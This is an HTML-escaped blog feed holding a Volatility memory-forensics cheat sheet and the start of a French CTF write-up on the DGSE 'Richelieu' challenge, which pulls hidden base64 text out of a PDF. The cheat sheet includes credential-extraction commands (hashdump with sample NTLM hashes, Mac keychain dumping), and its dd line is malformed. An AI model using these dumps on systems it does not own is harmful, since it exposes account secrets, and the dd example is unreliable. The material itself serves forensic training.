&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | less &lt;span class=&quot;c&quot;&gt;# better&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Win'&lt;/span&gt; | less
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Linux'&lt;/span&gt; | less
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Mac'&lt;/span&gt; | less

&lt;span class=&quot;c&quot;&gt;# list available commands&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^linux'&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^mac'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;windows&quot;&gt;windows&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# analyze command line&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86 cmdline
&lt;span class=&quot;k&quot;&gt;************************************************************************&lt;/span&gt;
mspaint.exe pid:   2644
Command line : &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;spaint.exe&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;nfo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lag.png&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;************************************************************************&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# analyze files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86 filescan

&lt;span class=&quot;c&quot;&gt;# filter files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86 filescan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;filename&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# clipboard content&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 clipboard
Session  WindowStation Format           Handle    Object       Data
&lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt;
1         WinSta0      CF_UNICODETEXT   0xd02d1   0xffbb3fb0   my_data
...

&lt;span class=&quot;c&quot;&gt;# dump host hashes&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86 hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;1001:aad3b435b51404eeaad3b435b51404ee:57e82f46aff390080f143c09ab2c5b68:::
info:1002:aad3b435b51404eeaad3b435b51404ee:382c7bf814461d8d685cf7a7a06c8c8f:::
&lt;span class=&quot;c&quot;&gt;# NTLM hash is 382c7bf814461d8d685cf7a7a06c8c8f&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;linux&quot;&gt;linux&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;By far, the most common mistake regarding Linux memory forensics is building a profile for a system other than the machine you want to analyze. For example, you cannot build a profile for a Debian 2.6.32 system to analyze a memory dump from Mandrake 2.6.32. Likewise you cannot build a profile for SuSE 2.5.35 system to analyze a memory dump from SuSE 2.6.42. You must ensure the profile you build matches the target system in 1) Linux distribution 2) exact kernel version 3) CPU architecture (32-bit, 64-bit, etc).&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cerate new image&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings mem.raw | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Linux version'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq
&lt;/span&gt;Linux version 4.4.0-72-lowlatency &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildd@lcy01-17&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc version 5.4.0 20160609 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 5.4.0-6ubuntu1~16.04.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# install Ubuntu 16.04&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# make&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;build-essential dwarfdump
&lt;span class=&quot;c&quot;&gt;# test with&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone &lt;span class=&quot;nt&quot;&gt;--depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 https://github.com/volatilityfoundation/volatility
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;volatility/tools/linux
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zip Ubuntu1604.zip volatility/tools/linux/module.dwarf /boot/System.map-4.4.0-72-lowlatency

&lt;span class=&quot;c&quot;&gt;# finish&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;Ubuntu1604.zip /usr/lib/python2.7/dist-packages/volatility/plugins/linux/

&lt;span class=&quot;c&quot;&gt;# test&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Ubuntu'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# bash history&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; mem.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxUbuntu1604x64 linux_bash

&lt;span class=&quot;c&quot;&gt;# process&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; mem.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxUbuntu1604x64 linux_psaux

&lt;span class=&quot;c&quot;&gt;# list file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; mem.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxUbuntu1604x64 linux_find_file &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# specific file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; mem.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxUbuntu1604x64 linux_find_file &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'file.txt'&lt;/span&gt;
...
3 0xffff88000c135324 /media/secret/file.txt
...

&lt;span class=&quot;c&quot;&gt;# dump file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; mem.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxUbuntu1604x64 linux_find_file &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 0xffff88000c135324 &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; file.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;mac&quot;&gt;mac&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# get profile&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; data.dmp mac_get_profile
Profile                              Shift Address
&lt;span class=&quot;nt&quot;&gt;------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;
MacSierra_11_8_1_AMDx64              0x00004000000

&lt;span class=&quot;c&quot;&gt;# bash history&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; data.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MacSierra_11_8_1_AMDx64 mac_bash

&lt;span class=&quot;c&quot;&gt;# list files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; data.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MacSierra_11_8_1_AMDx64 mac_list_files

&lt;span class=&quot;c&quot;&gt;# notes&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;notes
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; data.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MacSierra_11_8_1_AMDx64 mac_notesapp &lt;span class=&quot;nt&quot;&gt;--dump-dir&lt;/span&gt; notes/

&lt;span class=&quot;c&quot;&gt;# keychain&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; data.dmp &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MacSierra_11_8_1_AMDx64 mac_keychaindump
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;recover-data&quot;&gt;recover data&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# recover all device deleted data&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;extundelete /dev/mapper/foren &lt;span class=&quot;nt&quot;&gt;--restore-all&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; RECOVERED_FILES/
RECOVERED_FILES/
└── secret
    └── deleted_file.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;dd&quot;&gt;dd&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/sda &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;512 &lt;span class=&quot;nv&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 &lt;span class=&quot;nv&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./data.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;fdisk&quot;&gt;fdisk&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;fdisk &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /dev/sda
Disk /dev/sda: 64 GiB, 68719476736 bytes, 134217728 sectors
Units: sectors of 1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 512 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 512 bytes
Sector size &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;logical/physical&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 512 bytes / 512 bytes
I/O size &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;minimum/optimal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 512 bytes / 512 bytes
Disklabel &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: dos
Disk identifier: 0x0a423922

Device     Boot Start       End   Sectors Size Id Type
/dev/sda1  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     2048 134215679 134213632  64G 83 Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>dgse - richelieu</title>
   <link href="http://localhost:4000/ctf/2019/07/07/dgse-richelieu/"/>
   <updated>2019-07-07T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/07/dgse-richelieu</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;arrivé-sur-la-page-daccueil&quot;&gt;Arrivé sur la page d’accueil&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;On arrive sur une &lt;a href=&quot;https://www.challengecybersec.fr/&quot;&gt;page&lt;/a&gt; avec un compteur indiquant le nombre de jours restants avant la fin du challenge. Cependant, aucune information explicite sur le challenge à résoudre.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fr&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width,initial-scale=1,shrink-to-fit=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;theme-color&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#000000&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manifest&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manifest.json&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Challenge Richelieu&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;static/css/main.ba9d9d7d.chunk.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;noscript&amp;gt;&lt;/span&gt;Vous devez activer JavaScript pour utiliser l'application.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/noscript&amp;gt;&lt;/span&gt;			&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rien&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nothing&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./Richelieu.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Après un petit tour par le code source du site, on peut vois l’existence d’un &lt;code class=&quot;highlighter-rouge&quot;&gt;./Richelieu.pdf&lt;/code&gt; dans l’arborescence du site.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.challengecybersec.fr/Richelieu.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce fichier est un PDF assez volumineux avec plus de &lt;strong&gt;9 Mo.&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;pdf&quot;&gt;PDF&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Composé d’un grand nombre de page (&lt;strong&gt;364&lt;/strong&gt;). Cependant, il n’y a du texte (visible) que sur la première page. On se demande alors quelle est l’utilité de toutes les autres pages. On remarque avec notre souris que du texte écrit en très petite police occupe toutes les pages blanches. Il faudrait donc extraire tout le texte de ce PDF.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pdftotext Richelieu.pdf text_extracted.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous allons donc extraire tout le texte du fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;Richelieu.pdf&lt;/code&gt; vers &lt;code class=&quot;highlighter-rouge&quot;&gt;text_extracted.txt&lt;/code&gt; en utilisant &lt;code class=&quot;highlighter-rouge&quot;&gt;pdftotext&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;text_extracted.txt
Richelieu
L’histoire de la cryptologie serait incomplète sans citer Richelieu qui, dès
1624, sut recruter les meilleurs spécialistes en mathématiques. Il a ainsi pu
fonder, par la suite, ce qui est considéré aujourd’hui comme l&lt;span class=&quot;s1&quot;&gt;'un des tout
premiers bureaux du chiffre en Europe.
Lors du siège de La Rochelle (1627-1628), la cryptanalyse des messages des
Huguenots lui permit d’anticiper l’arrivée des Anglais venus aider ces derniers
par la mer. En octobre 1628, la ville finira par capituler sans condition.
/9j/2wBDADIiJSwlHzIsKSw4NTI7S31RS0VFS5ltc1p9tZ++u7Kfr6zI4f/zyNT/16yv+v/9////
////wfD/////////////wgALCA20CD4BAREA/8QAGQABAQEBAQEAAAAAAAAAAAAAAAECAwQF/9oA
CAEBAAAAAeFzUWUsiyzUFlgFgChLKud5lms2KluaLBNZs1neNSaRclSxqWLJ0xYVNQFyusxQlA1M
#...
x1x1eAsAAQToAwAABOgDAABQSwECHgMUAAkACACrg51OHIIIsGZHXwCfQ18ADwAYAAAAAAAAAAAA
pIFlCgAAbHNiX1JHQi5wbmcuZW5jVVQFAANCCsdcdXgLAAEE6AMAAAToAwAAUEsFBgAAAAAGAAYA
RAIAACRSXwAAAA==
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut retrouver le texte déjà visible sur le PDF, accompagné de tout le texte cachait, qui été en blanc sur le PDF. On a sûrement à faire à de la &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt;.&lt;/p&gt;

